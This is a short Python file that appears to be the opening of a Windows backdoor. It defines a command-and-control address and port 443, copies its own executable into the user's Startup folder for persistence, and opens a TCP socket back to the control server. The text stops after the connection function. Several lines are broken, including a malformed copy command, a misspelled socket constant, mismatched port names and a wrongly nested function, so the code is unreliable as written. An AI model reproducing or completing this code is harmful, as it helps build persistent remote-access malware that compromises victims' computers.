import socket
import subprocess
import threading
import time
import os


CCIP = ""
CCPRT = 443

def autorun():
    filen =os.path.basename(__file__)
    exe_file =filen.replace(".py",".exe")
    #print(exe_file)
    os.system("copy{}\"%APPDATA%\\Microsoft\\Windows%\\Start Menu\\Programs\Startup\"".format(exe_file))

    def conn(CCIP, CCPORT):
        try:
            client = socket.socket(socket_AF_INET, socket.SOCK_STREAM)
            client.connect((CCIP, CCPORT))
            return client
        except Exception as error:
            print(error)
